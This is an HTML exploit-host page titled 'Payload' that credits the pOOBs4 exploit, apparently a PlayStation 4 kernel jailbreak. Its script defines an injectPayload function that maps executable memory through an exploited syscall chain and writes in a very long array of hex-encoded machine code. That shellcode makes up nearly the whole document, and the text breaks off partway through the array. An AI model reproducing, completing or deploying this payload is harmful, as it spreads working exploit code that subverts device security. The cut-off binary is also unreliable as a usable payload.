<!DOCTYPE html><html>
<head>
<title>Payload</title>
<meta name=viewport content="width=device-width, initial-scale=1">
<style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
<script>

// original exploit: https://github.com/ChendoChap/pOOBs4

function showMessage(msg) {
  document.getElementById("message").innerHTML = msg;
  document.getElementById("message").style.display='block';
}

function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
{
	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
	var payload=[0X0000ade9,0X1e0ff300,0X4c5641fa,0X294e358d,0X55410000,0X41f7894c,0X2d8d4c54,0X0000295e,0X26e85355,0X4c000010,0X2972258d,0X894c0000,0X1017e8ef,0X8d480000,0X00298b2d,0Xe7894c00,0X001008e8,0X1d8d4800,0X000029b5,0Xe8ef8948,0X00000ff9,0Xe8df8948,0X00000ff1,0X48f6894c,0X29d83d8d,0X00e80000,0X4c000011,0X8d48ee89,0X0029e63d,0X10f1e800,0X894c0000,0X3d8d48e6,0X000029f8,0X0010e2e8,0Xee894800,0X103d8d48,0Xe800002a,0X000010d3,0X48de8948,0X2a393d8d,0Xc4e80000,0X5b000010,0X415dc031,0X415d415c,0X0ff3c35e,0X4855fa1e,0X5741e589,0X55415641,0X52415441,0Xf6314553,0X80ec8148,0Xe800000e,0X000013da,0X001761e8,0Xe8c03100,0X00002794,0X0027c6e8,0X858d4800,0Xfffff174,0X74b58944,0X48fffff1,0X8d4cc789,0X002a1a35,0X85c76600,0Xfffff178,0X89480000,0Xfff15085,0X26a5e8ff,0X894c0000,0X102ee8f7,0X894c0000,0X1003e8f7,0X8b4c0000,0X00336a25,0Xc5894100,0X0d1d8d48,0X8500003e,0X858d48c0,0Xfffff3a0,0X68858948,0X48fffff1,0Xf17a858d,0X8948ffff,0Xfff16085,0X858d48ff,0Xfffff7cd,0X58858948,0X0ffffff1,0X0007c085,0X3d8d4c00,0X000029bc,0Xe8ff894c,0X00000fd4,0Xe8ff894c,0X00000fa9,0X8941c085,0X33850fc6,0X31000001,0Xfe77e8c0,0Xfec5ffff,0X32df056f,0X8b480000,0Xfff168bd,0Xf08944ff,0X00030cb9,0X158d4800,0X0000298d,0X000400be,0Xb58d4c00,0Xfffff3cd,0Xfec5abf3,0Xf17a857f,0X8b48ffff,0Xfff1608d,0Xa5894cff,0Xfffff198,0X58bd8b48,0Xc6fffff1,0Xfff3cc85,0X85c701ff,0Xfffff3b0,0Xffffffff,0X8b4813ff,0Xfff1508d,0X48c031ff,0X2942158d,0X00be0000,0X4c000004,0X13fff789,0X167ec085,0X9848c8ff,0Xcd05bc80,0X0afffff3,0X84c60875,0Xfff3cd05,0Xc03100ff,0Xa0bd8d48,0Xb9fffff1,0X00000040,0Xa0a58d4c,0Xf3fffff1,0X3d8d4cab,0X0000296f,0X002cb941,0X8d4c0000,0X00388f05,0Xf9894c00,0X66158d48,0Xbe000029,0X00000100,0Xffe7894c,0Xbfc93113,0X00000259,0X4cc58941,0Xc031e289,0X000007be,0X26bbe800,0X8d480000,0X00390705,0X85388b00,0X440b78ff,0X894cea89,0X1bb1e8e6,0X894c0000,0X0080b9e7,0Xc0310000,0Xa0a58d4c,0Xf3fffff1,0X2cb941ab,0X41000000,0X058d4c55,0X00003828,0X894c5641,0X0cf5e9f9,0Xfec50000,0X31b30d6f,0X8b480000,0Xfff168bd,0Xe88944ff,0X00030cb9,0X158d4800,0X00002861,0X000400be,0Xc5abf300,0X7a8d7ffe,0X48fffff1,0Xf1608d8b,0X894cffff,0Xfff198a5,0Xbd8b48ff,0Xfffff158,0Xf3cc85c6,0Xc701ffff,0Xfff3b085,0Xffffffff,0Xffc031ff,0X8d8b4813,0Xfffff150,0X8d48c031,0Xfff3cdbd,0X158d48ff,0X000028c4,0X000400be,0X8513ff00,0Xff167ec0,0X809848c8,0Xf3cd05bc,0X750affff,0X0584c608,0Xfffff3cd,0X48c03100,0Xf1a0bd8d,0X40b9ffff,0X4c000000,0Xf1a0ad8d,0Xabf3ffff,0X002eb941,0X8d4c0000,0X00376b05,0X0d8d4800,0X00002837,0X3e158d48,0Xbe000028,0X00000100,0Xffef894c,0Xbfc93113,0X00000259,0X4cc68941,0Xc031ea89,0X000007be,0X2593e800,0X8d480000,0X0037df05,0X85388b00,0X440b78ff,0X894cf289,0X1a89e8ee,0Xc0310000,0Xb9ef894c,0X00000080,0Xa0ad8d4c,0Xf3fffff1,0X858d48ab,0Xfffff3cd,0X8d4c5141,0X0036ff05,0Xb9415000,0X0000002e,0Xc40d8d48,0X48000027,0X27de158d,0X00be0000,0X4c000002,0Xc031ef89,0Xc93113ff,0X000259bf,0Xc6894100,0X31ea894c,0X0007bec0,0X1ee80000,0X48000025,0X376a058d,0X5a410000,0X388b5b41,0X0b78ff85,0X4cf28944,0X10e8ee89,0X4800001a,0X3872058d,0Xc9310000,0X68b58b48,0Xbafffff1,0X00000c30,0X8d4cff31,0X0027d12d,0X358d4c00,0X0000288c,0X894c10ff,0X0befe8ff,0Xc0310000,0Xfffba0e8,0X01ffbeff,0X8d480000,0X00279e3d,0X0c4fe800,0X894c0000,0X0ebbe8ef,0Xffbe0000,0X4c000001,0X3ae8ef89,0X4800000c,0X27a2358d,0X8d480000,0X0025a53d,0X0ccde800,0X8d480000,0X0027ab35,0X3d8d4800,0X000025af,0X000cbae8,0X358d4800,0X000027b8,0Xbd3d8d48,0Xe8000025,0X00000ca7,0X0001ffbe,0X3d8d4800,0X000027c6,0X000bf0e8,0X01ffbe00,0X8d480000,0X0027d43d,0X0bdfe800,0Xffbe0000,0X4c000001,0Xd2e8f789,0Xbe00000b,0X000001ff,0X143d8d48,0Xe8000028,0X00000bc1,0X0001ffbe,0X3d8d4800,0X00002832,0X000bb0e8,0X01ffbe00,0X8d480000,0X0028553d,0X0b9fe800,0Xffbe0000,0X48000001,0X287b3d8d,0X8ee80000,0Xbe00000b,0X000001ff,0Xa43d8d48,0Xe8000028,0X00000b7d,0X0001ffbe,0X3d8d4800,0X000028b7,0X000b6ce8,0X01ffbe00,0X8d480000,0X0028cf3d,0X0b5be800,0Xffbe0000,0X48000001,0X28e83d8d,0X4ae80000,0Xbe00000b,0X000001ff,0X023d8d48,0Xe8000029,0X00000b39,0X0001ffbe,0X3d8d4800,0X0000291d,0X000b28e8,0X01ffbe00,0X8d480000,0X0029363d,0X0b17e800,0Xffbe0000,0X48000001,0X29563d8d,0X06e80000,0Xbe00000b,0X000001ff,0X7d3d8d48,0Xe8000029,0X00000af5,0X156ffec5,0X00002e9d,0X68bd8b48,0X31fffff1,0X030cb9c0,0X8d480000,0X00254c15,0X0400be00,0Xabf30000,0X957ffec5,0Xfffff17a,0X608d8b48,0X4cfffff1,0Xf198a589,0X8b48ffff,0Xfff158bd,0Xcc85c6ff,0X01fffff3,0Xf3b085c7,0Xffffffff,0X13ffffff,0X8d48c031,0Xfff3cdbd,0X158d48ff,0X00002950,0X000400be,0X8513ff00,0Xff167ec0,0X809848c8,0Xf3cd05bc,0X750affff,0X0584c608,0Xfffff3cd,0X48c03100,0Xf1a0bd8d,0X40b9ffff,0X4c000000,0Xf1a0ad8d,0Xabf3ffff,0X0047b941,0X8d4c0000,0X00345f05,0X0d8d4800,0X0000252b,0X32158d48,0Xbe000025,0X00000100,0Xffef894c,0Xbfc93113,0X00000259,0X4cc78941,0Xc031ea89,0X000007be,0X2287e800,0X8d480000,0X0034d305,0X85388b00,0X440b78ff,0X894cfa89,0X177de8ee,0Xc0310000,0Xb9ef894c,0X00000080,0Xa0ad8d4c,0Xf3fffff1,0X858d48ab,0Xfffff3cd,0Xf5058d4c,0X41000033,0X000047b9,0X158d4800,0X000024dc,0X000200be,0Xef894c00,0X0d8d4851,0X000024ab,0Xffc03150,0Xbec93113,0X00000007,0X000259bf,0Xc7894100,0X31ea894c,0X2213e8c0,0X8d480000,0X00345f05,0X58415e00,0Xff85388b,0X89440b78,0Xee894cfa,0X001706e8,0X058d4800,0X00003568,0X8b48c931,0Xfff168b5,0X0c30baff,0Xff310000,0Xcdbd8d4c,0Xfffffff3,0Xf6894c10,0X423d8d48,0Xe8000028,0X00000a96,0X4c358d48,0X48000028,0X286d3d8d,0X83e80000,0X4800000a,0X26b2358d,0X8d480000,0X0028653d,0X0a70e800,0X8d480000,0X0026c935,0X3d8d4800,0X0000285f,0X000a5de8,0X358d4800,0X000026e1,0X5a3d8d48,0Xe8000028,0X00000a4a,0X55358d48,0X48000027,0X28563d8d,0X37e80000,0X4800000a,0X277a358d,0X8d480000,0X00285e3d,0X0a24e800,0X8d480000,0X00256135,0X3d8d4800,0X0000286a,0X000a11e8,0X358d4800,0X00002582,0X6e3d8d48,0Xe8000028,0X000009fe,0Xa6358d48,0X48000025,0X28753d8d,0Xebe80000,0Xc5000009,0X5a1d6ffe,0X4800002c,0Xf168bd8b,0Xc031ffff,0X00030cb9,0X158d4800,0X00002309,0X000400be,0Xc5abf300,0X7a9d7ffe,0X48fffff1,0Xf1608d8b,0X894cffff,0Xfff198a5,0Xbd8b48ff,0Xfffff158,0Xf3cc85c6,0Xc701ffff,0Xfff3b085,0Xffffffff,0X3113ffff,0X158d48c0,0X00002830,0X000400be,0Xff894c00,0Xc08513ff,0Xc8ff167e,0Xbc809848,0Xfff3cd05,0X08750aff,0Xcd0584c6,0X00fffff3,0X8d48c031,0Xfff1a0bd,0X0040b9ff,0X8d4c0000,0Xfff1a0a5,0X4cabf3ff,0X22f9358d,0Xb9410000,0X00000052,0X19058d4c,0X4c000032,0X8d48f189,0X0022f015,0X0100be00,0X894c0000,0X3113ffe7,0X0259bfc9,0X89410000,0Xe2894cc5,0X07bec031,0Xe8000000,0X00002045,0X91058d48,0X8b000032,0X78ff8538,0Xea89440b,0Xe8e6894c,0X0000153b,0Xb9e7894c,0X00000080,0X8d4cc031,0Xfff1a0a5,0X41abf3ff,0X000052b9,0X57415200,0X000680e9,0X6ffec500,0X002b4825,0Xbd8b4800,0Xfffff168,0X0cb9c031,0X48000003,0X21f7158d,0X00be0000,0Xf3000004,0X7ffec5ab,0Xfff17aa5,0X8d8b48ff,0Xfffff160,0X98a5894c,0X48fffff1,0Xf158bd8b,0X85c6ffff,0Xfffff3cc,0Xb085c701,0Xfffffff3,0Xffffffff,0X8d8b4813,0Xfffff150,0X8d48c031,0Xfff3cdbd,0X158d48ff,0X00002725,0X000400be,0X8513ff00,0Xff167ec0,0X809848c8,0Xf3cd05bc,0X750affff,0X0584c608,0Xfffff3cd,0X48c03100,0Xf1a0bd8d,0X40b9ffff,0X41000000,0X000055b9,0X48abf300,0Xf1a0858d,0X8d4cffff,0X00310305,0Xc7894800,0X50858948,0X48fffff1,0X21c50d8d,0X8d480000,0X0021cc15,0X0100be00,0Xc0310000,0X8b4813ff,0Xfff15095,0Xbfc931ff,0X00000259,0Xbec58941,0X00000007,0X1ee8c031,0X4800001f,0X316a058d,0X388b0000,0X0f78ff85,0X50b58b48,0X44fffff1,0X10e8ea89,0X48000014,0Xf150bd8b,0Xc031ffff,0X000080b9,0Xad8d4c00,0Xfffff1a0,0X0055b941,0X8d4c0000,0X00308705,0X158d4800,0X00002174,0X8d48abf3,0Xfff3cd85,0X485241ff,0X21410d8d,0Xbe500000,0X00000200,0X31ef894c,0X3113ffc0,0X0259bfc9,0X89410000,0Xea894cc7,0X07bec031,0Xe8000000,0X00001ea1,0Xed058d48,0X41000030,0X58388b5b,0X0b78ff85,0X4cfa8944,0X94e8ee89,0X48000013,0X31f6058d,0Xc9310000,0X68b58b48,0Xbafffff1,0X00000c30,0X8d4cff31,0X00261e2d,0X4c10ff00,0X8d4cf789,0X0026d435,0X0573e800,0Xc0310000,0Xfff524e8,0X01ffbeff,0X8d480000,0X0025eb3d,0X05d3e800,0X894c0000,0X083fe8ef,0Xffbe0000,0X4c000001,0Xbee8ef89,0X48000005,0X25ef358d,0X8d480000,0X001f293d,0X0651e800,0X8d480000,0X0025f835,0X3d8d4800,0X00001f33,0X00063ee8,0X358d4800,0X00002605,0X413d8d48,0Xe800001f,0X0000062b,0X0001ffbe,0X3d8d4800,0X00002613,0X000574e8,0X01ffbe00,0X8d480000,0X0026213d,0X0563e800,0Xffbe0000,0X4c000001,0X56e8f789,0Xbe000005,0X000001ff,0X613d8d48,0Xe8000026,0X00000545,0X0001ffbe,0X3d8d4800,0X0000267f,0X000534e8,0X01ffbe00,0X8d480000,0X0026a23d,0X0523e800,0Xffbe0000,0X48000001,0X26c83d8d,0X12e80000,0Xbe000005,0X000001ff,0Xf13d8d48,0Xe8000026,0X00000501,0X0001ffbe,0X3d8d4800,0X00002704,0X0004f0e8,0X01ffbe00,0X8d480000,0X00271c3d,0X04dfe800,0Xffbe0000,0X48000001,0X27353d8d,0Xcee80000,0Xbe000004,0X000001ff,0X4f3d8d48,0Xe8000027,0X000004bd,0X0001ffbe,0X3d8d4800,0X0000276a,0X0004ace8,0X01ffbe00,0X8d480000,0X0027833d,0X049be800,0Xffbe0000,0X48000001,0X27a33d8d,0X8ae80000,0Xbe000004,0X000001ff,0Xca3d8d48,0Xe8000027,0X00000479,0X2d6ffec5,0X00002821,0X68bd8b48,0X31fffff1,0X030cb9c0,0X8d480000,0X001ed015,0X0400be00,0Xabf30000,0Xad7ffec5,0Xfffff17a,0X608d8b48,0X4cfffff1,0Xf198a589,0X8b48ffff,0Xfff158bd,0Xcc85c6ff,0X01fffff3,0Xf3b085c7,0Xffffffff,0X13ffffff,0X8d48c031,0Xfff3cdbd,0X158d48ff,0X000022d4,0X000400be,0X8513ff00,0Xff167ec0,0X809848c8,0Xf3cd05bc,0X750affff,0X0584c608,0Xfffff3cd,0X48c03100,0Xf1a0bd8d,0X40b9ffff,0X4c000000,0Xf1a0ad8d,0Xabf3ffff,0X006eb941,0X8d4c0000,0X002de305,0X0d8d4800,0X00001eaf,0Xb6158d48,0Xbe00001e,0X00000100,0Xffef894c,0Xbfc93113,0X00000259,0X4cc78941,0Xc031ea89,0X000007be,0X1c0be800,0X8d480000,0X002e5705,0X85388b00,0X440b78ff,0X894cfa89,0X1101e8ee,0X8b480000,0Xfff150bd,0Xb9c031ff,0X00000080,0Xa0ad8d4c,0X41fffff1,0X00006eb9,0X058d4c00,0X00002d78,0X65158d48,0Xf300001e,0X858d48ab,0Xfffff3cd,0X0d8d4856,0X00001e33,0X0200be50,0X894c0000,0Xffc031ef,0Xbfc93113,0X00000259,0X4cc78941,0Xc031ea89,0X000007be,0X1b93e800,0X8d480000,0X002ddf05,0X41584100,0X85388b59,0X440b78ff,0X894cfa89,0X1085e8ee,0X8d480000,0X002ee705,0X48c93100,0Xf168b58b,0X30baffff,0X3100000c,0Xbd8d4cff,0Xfffff3cd,0X894c10ff,0X3d8d48f6,0X000021c1,0X000415e8,0X358d4800,0X0000265d,0Xec3d8d48,0Xe8000021,0X00000402,0Xfa358d48,0X48000024,0X21e43d8d,0Xefe80000,0X48000003,0X2511358d,0X8d480000,0X0021de3d,0X03dce800,0X8d480000,0X00252935,0X3d8d4800,0X000021d9,0X0003c9e8,0X358d4800,0X0000259d,0Xd53d8d48,0Xe8000021,0X000003b6,0Xc2358d48,0X48000025,0X21dd3d8d,0Xa3e80000,0X48000003,0X23a9358d,0X8d480000,0X0021e93d,0X0390e800,0X8d480000,0X0023ca35,0X3d8d4800,0X000021ed,0X00037de8,0X358d4800,0X000023ee,0Xf43d8d48,0Xe8000021,0X0000036a,0X356ffec5,0X000025d9,0X68bd8b48,0X31fffff1,0X030cb9c0,0X8d480000,0X001c8815,0X0400be00,0Xabf30000,0Xb57ffec5,0Xfffff17a,0X608d8b48,0X4cfffff1,0Xf198a589,0X8b48ffff,0Xfff158bd,0Xcc85c6ff,0X01fffff3,0Xf3b085c7,0Xffffffff,0X13ffffff,0X8d48c031,0X0021af15,0X0400be00,0X894c0000,0X8513ffff,0Xff167ec0,0X809848c8,0Xf3cd05bc,0X750affff,0X0584c608,0Xfffff3cd,0X48c03100,0Xf1a0bd8d,0X40b9ffff,0X4c000000,0Xf1a0a58d,0Xabf3ffff,0X78358d4c,0X4100001c,0X000079b9,0X058d4c00,0X00002b98,0X48f1894c,0X1c6f158d,0X00be0000,0X4c000001,0X13ffe789,0X59bfc931,0X41000002,0X894cc589,0Xbec031e2,0X00000007,0X0019c4e8,0X058d4800,0X00002c10,0Xff85388b,0X89440b78,0Xe6894cea,0X000ebae8,0Xbd8b4800,0Xfffff150,0X000080b9,0X4cc03100,0Xf1a0a58d,0Xb941ffff,0X00000079,0X4151abf3,0X058d4c57,0X00002b2c,0X48f1894c,0X1c16158d,0X00be0000,0X4c000002,0X13ffe789,0X894cc931,0X0259bfe2,0Xc3890000,0X000007be,0Xe8c03100,0X00001959,0Xa5058d48,0X8b00002b,0X855a5838,0X890a78ff,0Xe6894cda,0X000e4ee8,0X058d4800,0X00002cb0,0X8b48c931,0Xfff168b5,0X0c30baff,0Xff310000,0X8d4810ff,0Xc031d065,0X415a415b,0X415d415c,0X5d5f415e,0Xc0c748c3,0X00000003,0X00190be9,0Xc0c74800,0X00000004,0X0018ffe9,0Xc0c74800,0X00000005,0X0018f3e9,0Xc0c74800,0X00000006,0X0018e7e9,0Xc0c74800,0X0000000a,0X0018dbe9,0Xc0c74800,0X00000009,0X0018cfe9,0Xc0c74800,0X0000003a,0X0018c3e9,0Xc0c74800,0X00000039,0X0018b7e9,0Xc0c74800,0X00000015,0X0018abe9,0Xc0c74800,0X0000017a,0X00189fe9,0Xc0c74800,0X00000016,0X001893e9,0Xc0c74800,0X0000007b,0X001887e9,0Xc0c74800,0X0000007c,0X00187be9,0Xc0c74800,0X00000080,0X00186fe9,0Xc0c74800,0X00000088,0X001863e9,0Xc0c74800,0X00000089,0X001857e9,0Xc0c74800,0X000000bc,0X00184be9,0Xc0c74800,0X000000bd,0X00183fe9,0Xc0c74800,0X000000be,0X001833e9,0Xc0c74800,0X00000110,0X001827e9,0Xc0c74800,0X000001de,0X00181be9,0Xc0c74800,0X000001ed,0X00180fe9,0X1e0ff300,0X31d231fa,0X02e851f6,0X89ffffff,0X83c031c7,0X0a74ffff,0Xffff00e8,0X0001b8ff,0Xc35a0000,0Xfa1e0ff3,0X0001ffba,0X0601be00,0Xe8510000,0Xfffffed9,0X74fff883,0Xc7895a08,0Xfffed8e9,0Xf3c358ff,0X41fa1e0f,0X55d23154,0Xf3894853,0Xb6e8f631,0X83fffffe,0X7574fff8,0X0001ffba,0X0601be00,0X89480000,0Xe8c589df,0Xfffffe9d,0X41fff883,0X4e74c489,0X39058d48,0Xbf00002e,0X00400000,0X854810ff,0Xc38948c0,0X00ba3074,0X48004000,0Xef89de89,0Xfffe58e8,0Xc08548ff,0X74c28948,0Xde89480d,0Xe8e78944,0Xfffffe51,0X8d48dceb,0X002df705,0Xdf894800,0X894410ff,0Xfe53e8e7,0X895bffff,0X5c415def,0Xfffe48e9,0X415d5bff,0X0ff3c35c,0X5741fa1e,0X55415641,0X53555441,0X98ec8148,0X48000008,0X2c2e058d,0X89480000,0X4808247c,0X10fff589,0X0fc08548,0X0000fa84,0X01ffbe00,0X89480000,0Xc38948ef,0X5c3d8d4c,0Xe8000022,0Xfffffe81,0Xf5058d48,0X4800002b,0X10ffdf89,0X0fc08548,0X0000c284,0X258d4c00,0X00002d00,0X08c08348,0X24048948,0X48fe894c,0Xff41c789,0Xc0852414,0X8b48ce74,0X8d48243c,0X00221c35,0X14ff4100,0X74c08524,0X358d4cbb,0X00002cc0,0X24a48d4c,0X00000090,0X240c8b48,0Xfd358d48,0X48000021,0X0824548b,0X31e7894c,0Xac8d4cc0,0X00049024,0X16ff4100,0X240c8b48,0X48ea8948,0X21da358d,0X894c0000,0X41c031ef,0X8d4816ff,0X4c182474,0X02e8e789,0X85fffffe,0X61850fc0,0X8bffffff,0X66202444,0X66f00025,0X7540003d,0Xee894c10,0Xe8e7894c,0Xffffff02,0Xffff43e9,0X003d66ff,0X39850f80,0X4cffffff,0X894cee89,0Xfe55e8e7,0X29e9ffff,0X48ffffff,0X2af6058d,0X89480000,0X4810ffdf,0X0898c481,0X5d5b0000,0X5d415c41,0X5f415e41,0X1e0ff3c3,0X415741fa,0X41554156,0X48535554,0X0088ec81,0X8d480000,0X002af305,0Xfc894900,0Xffffcb83,0Xc0854810,0X0110840f,0X89490000,0X4cdb31c5,0X2129358d,0Xdb850000,0X00d3850f,0X8d480000,0X002abf05,0Xef894c00,0X854810ff,0Xbe840fc0,0X4c000000,0X2bca3d8d,0X8d480000,0X894c0868,0Xef8948f6,0X8517ff41,0X48d374c0,0X20ef358d,0X89480000,0X17ff41ef,0Xc274c085,0Xa93d8d4c,0X4c00002b,0Xff41e789,0Xef894817,0X41c38948,0X8d4817ff,0X4802035c,0X2c06058d,0X89480000,0X4810ffdf,0X8949c085,0X4c6374c7,0X2b5a0d8d,0X89480000,0Xc78948de,0X4ce88949,0X8d48e189,0X00209f15,0X41c03100,0X8d4811ff,0X4c082474,0Xcae8ff89,0X83fffffc,0Xc085ffcb,0X448b1f75,0X894c1024,0X002566ff,0X003d66f0,0Xe8077540,0Xffffff09,0X16e805eb,0X89fffffc,0X058d48c3,0X00002b98,0Xffff894c,0Xff28e910,0Xcb83ffff,0X058d48ff,0X000029c4,0Xffef894c,0X75db8510,0Xc4814819,0X00000088,0X5be7894c,0X415c415d,0X415e415d,0Xfc5be95f,0X8148ffff,0X000088c4,0X5bd88900,0X415c415d,0X415e415d,0Xc748c35f,0X000025c0,0X149ee900,0Xc7480000,0X000036c0,0X1492e900,0Xc7480000,0X00000bc0,0X1486e900,0X0ff30000,0X4853fa1e,0X290e1d8d,0X3b830000,0X75850f00,0X48000003,0X28e6058d,0Xd2310000,0X48de8948,0X1fd03d8d,0X89480000,0X0943e810,0Xc0850000,0X89482274,0X3d8d48de,0X00001fc9,0X000930e8,0X74c08500,0Xde89480f,0Xc93d8d48,0Xe800001f,0X0000091d,0X8d483b8b,0X001fce35,0X158d4800,0X000028ac,0X0008f0e8,0X483b8b00,0X1fcb358d,0X8d480000,0X00288f15,0X08dbe800,0X3b8b0000,0Xc7358d48,0X4800001f,0X2872158d,0Xc6e80000,0X8b000008,0X358d483b,0X00001fba,0X55158d48,0Xe8000028,0X000008b1,0X8d483b8b,0X001fb435,0X158d4800,0X00002838,0X00089ce8,0X483b8b00,0X1fb8358d,0X8d480000,0X00281b15,0X0887e800,0X3b8b0000,0Xc1358d48,0X4800001f,0X27fe158d,0X72e80000,0X8b000008,0X358d483b,0X00001fc5,0Xe1158d48,0Xe8000027,0X0000085d,0X8d483b8b,0X001fcd35,0X158d4800,0X000027c4,0X000848e8,0X483b8b00,0X1fc6358d,0X8d480000,0X0027a715,0X0833e800,0X3b8b0000,0Xbf358d48,0X4800001f,0X278a158d,0X1ee80000,0X8b000008,0X358d483b,0X00001fb8,0X6d158d48,0Xe8000027,0X00000809,0X8d483b8b,0X001fb235,0X158d4800,0X00002750,0X0007f4e8,0X483b8b00,0X1fac358d,0X8d480000,0X00273315,0X07dfe800,0X3b8b0000,0Xa6358d48,0X4800001f,0X2716158d,0Xcae80000,0X8b000007,0X358d483b,0X00001fa1,0Xf9158d48,0Xe8000026,0X000007b5,0X8d483b8b,0X001fa235,0X158d4800,0X000026dc,0X0007a0e8,0X483b8b00,0X1fa5358d,0X8d480000,0X0026bf15,0X078be800,0X3b8b0000,0Xa7358d48,0X4800001f,0X26a2158d,0X76e80000,0X8b000007,0X358d483b,0X00001f99,0X85158d48,0Xe8000026,0X00000761,0X8d483b8b,0X001f9135,0X158d4800,0X00002668,0X00074ce8,0X483b8b00,0X1f84358d,0X8d480000,0X00264b15,0X0737e800,0X3b8b0000,0X76358d48,0X4800001f,0X262e158d,0X22e80000,0X8b000007,0X358d483b,0X00001f6e,0X11158d48,0Xe8000026,0X0000070d,0X8d483b8b,0X001f7035,0X158d4800,0X000025f4,0X0006f8e8,0X483b8b00,0X1f71358d,0X8d480000,0X0025d715,0X06e3e800,0X3b8b0000,0X72358d48,0X4800001f,0X25ba158d,0Xcee80000,0X8b000006,0X358d483b,0X00001f73,0X9d158d48,0Xe8000025,0X000006b9,0X8d483b8b,0X001f7435,0X158d4800,0X00002580,0X0006a4e8,0X483b8b00,0X1f66358d,0X8d480000,0X00256315,0X068fe800,0X3b8b0000,0X58358d48,0X4800001f,0X2546158d,0X7ae80000,0X8b000006,0X358d483b,0X00001f4a,0X29158d48,0Xe8000025,0X00000665,0X8d483b8b,0X001f3c35,0X158d4800,0X0000250c,0X000650e8,0X483b8b00,0X1f2e358d,0X8d480000,0X0024ef15,0X063be800,0X3b8b0000,0X22358d48,0X4800001f,0X24d2158d,0X26e80000,0X8b000006,0X358d483b,0X00001f16,0Xb5158d48,0Xe8000024,0X00000611,0X8d483b8b,0X001f2235,0X158d4800,0X00002498,0X0005fce8,0X483b8b00,0X1f2d358d,0X8d480000,0X00247b15,0X05e7e800,0X3b8b0000,0X34358d48,0X4800001f,0X245e158d,0Xe95b0000,0X000005d1,0X0ff3c35b,0X5355fa1e,0X1d8d4856,0X000027a0,0X0f003b83,0X0005b485,0X058d4800,0X00002548,0X45c93145,0Xc931c031,0Xf631d231,0X0f3d8d48,0Xff00001f,0X158d4810,0X0000276c,0X17358d48,0X8900001f,0X480389c7,0X1fbf2d8d,0X7ee80000,0X8b000005,0X358d483b,0X00001f05,0X3d158d48,0Xe8000027,0X00000569,0X8d483b8b,0X001ef535,0X158d4800,0X00002720,0X000554e8,0X483b8b00,0X1ee7358d,0X8d480000,0X00270315,0X053fe800,0X3b8b0000,0Xda358d48,0X4800001e,0X26e6158d,0X2ae80000,0X8b000005,0X358d483b,0X00001ece,0Xc9158d48,0Xe8000026,0X00000515,0X8d483b8b,0X001ec035,0X158d4800,0X000026ac,0X000500e8,0X483b8b00,0X1eb2358d,0X8d480000,0X00268f15,0X04ebe800,0X3b8b0000,0Xa4358d48,0X4800001e,0X2672158d,0Xd6e80000,0X8b000004,0X358d483b,0X00001e97,0X55158d48,0Xe8000026,0X000004c1,0X8d483b8b,0X001e8c35,0X158d4800,0X00002638,0X0004ace8,0X483b8b00,0X1e7e358d,0X8d480000,0X00261b15,0X0497e800,0X3b8b0000,0X71358d48,0X4800001e,0X25fe158d,0X82e80000,0X8b000004,0X358d483b,0X00001e66,0Xe1158d48,0Xe8000025,0X0000046d,0X8d483b8b,0X001e5835,0X158d4800,0X000025c4,0X000458e8,0X483b8b00,0X1e4b358d,0X8d480000,0X0025a715,0X0443e800,0X3b8b0000,0X3d358d48,0X4800001e,0X258a158d,0X2ee80000,0X8b000004,0X358d483b,0X00001e2f,0X6d158d48,0Xe8000025,0X00000419,0X8d483b8b,0X001e2235,0X158d4800,0X00002550,0X000404e8,0X483b8b00,0X1e15358d,0X8d480000,0X00253315,0X03efe800,0X3b8b0000,0X09358d48,0X4800001e,0X2516158d,0Xdae80000,0X8b000003,0X358d483b,0X00001dff,0Xf9158d48,0Xe8000024,0X000003c5,0X8d483b8b,0X001df135,0X158d4800,0X000024dc,0X0003b0e8,0X483b8b00,0X8d48ee89,0X0024c315,0X039fe800,0X3b8b0000,0Xd9358d48,0X4800001d,0X24a6158d,0X8ae80000,0X8b000003,0X358d483b,0X00001dcb,0X89158d48,0Xe8000024,0X00000375,0X8d483b8b,0X001dbe35,0X158d4800,0X0000246c,0X000360e8,0X483b8b00,0X1db0358d,0X8d480000,0X00244f15,0X034be800,0X3b8b0000,0X48ee8948,0X245e158d,0X3ae80000,0X8b000003,0X358d483b,0X00001d91,0X21158d48,0Xe8000024,0X00000325,0X8d483b8b,0X001d8235,0X158d4800,0X00002404,0X000310e8,0X483b8b00,0X1d74358d,0X8d480000,0X0023e715,0X02fbe800,0X3b8b0000,0X67358d48,0X4800001d,0X23ca158d,0Xe6e80000,0X8b000002,0X358d483b,0X00001d57,0Xad158d48,0Xe8000023,0X000002d1,0X8d483b8b,0X001d4735,0X158d4800,0X00002390,0X0002bce8,0X483b8b00,0X1d3a358d,0X8d480000,0X00237315,0X02a7e800,0X3b8b0000,0X2e358d48,0X4800001d,0X2356158d,0X92e80000,0X8b000002,0X358d483b,0X00001d24,0X39158d48,0Xe8000023,0X0000027d,0X8d483b8b,0X001d1635,0X158d4800,0X0000231c,0X000268e8,0X483b8b00,0X1d07358d,0X8d480000,0X0022ff15,0X0253e800,0X3b8b0000,0Xf7358d48,0X4800001c,0X22e2158d,0X3ee80000,0X8b000002,0X358d483b,0X00001ce8,0Xc5158d48,0Xe8000022,0X00000229,0X8d483b8b,0X001cd835,0X158d4800,0X000022a8,0X000214e8,0X483b8b00,0X1ccb358d,0X8d480000,0X00228b15,0X01ffe800,0X3b8b0000,0Xc0358d48,0X4800001c,0X226e158d,0Xeae80000,0X8b000001,0X358d483b,0X00001cb1,0X51158d48,0Xe8000022,0X000001d5,0X8d483b8b,0X001ca435,0X158d4800,0X00002234,0X0001c0e8,0X483b8b00,0X1c94358d,0X8d480000,0X00221715,0X01abe800,0X3b8b0000,0X86358d48,0X4800001c,0X21fa158d,0X96e80000,0X8b000001,0X358d483b,0X00001c7a,0Xdd158d48,0Xe8000021,0X00000181,0X8d483b8b,0X001c6f35,0X158d4800,0X000021c0,0X00016ce8,0X483b8b00,0X1c66358d,0X8d480000,0X0021a315,0X0157e800,0X3b8b0000,0X58358d48,0X4800001c,0X2186158d,0X42e80000,0X8b000001,0X358d483b,0X00001c4b,0X69158d48,0Xe8000021,0X0000012d,0X8d483b8b,0X001c3e35,0X158d4800,0X0000214c,0X000118e8,0X483b8b00,0X1c33358d,0X8d480000,0X00212f15,0X0103e800,0X